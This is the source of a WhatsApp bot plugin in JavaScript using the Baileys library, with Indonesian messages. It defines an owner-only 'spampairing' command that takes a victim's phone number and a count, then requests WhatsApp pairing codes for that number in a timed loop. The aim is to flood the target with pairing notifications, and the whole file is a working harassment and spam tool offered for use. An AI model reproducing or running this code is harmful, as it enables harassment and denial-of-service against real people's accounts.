const { makeWASocket,
 useMultiFileAuthState,
 makeCacheableSignalKeyStore } = (await import('@adiwajshing/baileys')).default
import {
 Boom
} from "@hapi/boom";
import NodeCache from "node-cache";
import Pino from "pino";

if (!(global.socks instanceof Array)) {
 global.socks = [];
}
let handler = async (m, { conn, text, usedPrefix, command }) => {
 if (!text) throw `> *Harap masukan nomor.*`;

 let [nomor, jumlah] = text.split(" ");
 let dir = "spampair/" + m.sender.split("@")[0];
 const {
 state,
 saveCreds
 } = await useMultiFileAuthState(dir);
 const cache = new NodeCache();

 m.reply(`> *– 乂 Memulai Proses Spam!*\n\n> *Number:* @${nomor}
> *Total:* ${jumlah||20}`);

 const config = {
 logger: Pino({
 level: "fatal",
 }).child({
 level: "fatal",
 }),
 printQRInTerminal: false,
 mobile: false,
 auth: {
 creds: state.creds,
 keys: makeCacheableSignalKeyStore(
 state.keys,
 Pino({
 level: "fatal",
 }).child({
 level: "fatal",
 }),
 ),
 },
 version: [2, 3e3, 1015901307],
 browser: ["Ubuntu", "Edge", "110.0.1587.56"],
 markOnlineOnConnect: true,
 generateHighQualityLinkPreview: true,
 msgRetryCounterCache: cache,
 defaultQueryTimeoutMs: undefined,
 };
 conn = makeWASocket(config);

 setTimeout(async () => {
 for (let i = 0; i < (+jumlah||30); i++) {
 try {
 let pairing = await conn.requestPairingCode(nomor, "KRIZZ081");
 let code = pairing?.match(/.{1,4}/g)?.join("-")||pairing;
 console.log(`> 😛 Kode pairing anda: ${code}`);
 } catch (err) {
 console.log(`> ❌ Gagal mendapatkan pairing code: ${err.message}`);
 }
 await new Promise(resolve => setTimeout(resolve, 1000));
 }
 }, 3000);
 }
handler.help = ["spampairing"].map((a) => a + " *[nomer]*");
handler.tags = ["owner"];
handler.command = ["spampairing"];
handler.rowner = true
export default handler;
